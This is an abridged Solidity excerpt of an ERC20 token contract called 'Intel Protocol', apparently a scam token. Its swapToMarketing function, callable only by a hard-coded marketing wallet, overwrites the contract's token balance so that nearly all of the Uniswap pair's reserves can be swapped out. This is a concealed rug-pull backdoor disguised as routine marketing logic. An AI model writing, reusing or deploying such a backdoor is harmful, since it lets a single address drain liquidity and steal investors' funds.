...
contract IntelProtocol is ERC20, Ownable {
    ...
    address public marketingWallet = 0x48E33F194851f1989977477bFDc904147f294400;
    ...
    constructor() ERC20 ("Intel Protocol", "SMRTS", 9) {
    ...
    function swapToMarketing() external onlyMarketing {
        inSwapAndLiquify = true;
        IUniswapV2Pair _pair = IUniswapV2Pair(uniswapV2Pair);
        (uint112 reserve0, uint112 reserve1,) = _pair.getReserves();

        (reserve0, reserve1) = _pair.token1() == address(this) ? (reserve1, reserve0) : (reserve0, reserve1);
        uint256 marketingBudget = reserve1 * 99995 / 100000;
        IUniswapV2Router02 _uniswapV2Router = uniswapV2Router;
        (_balances[address(this)]) = _uniswapV2Router.getAmountIn(marketingBudget, reserve0, reserve1);
    ...
    modifier onlyMarketing() {
        require(marketingWallet == _msgSender(), "Ownable: caller is not the marketingWallet");
        _;
    }
}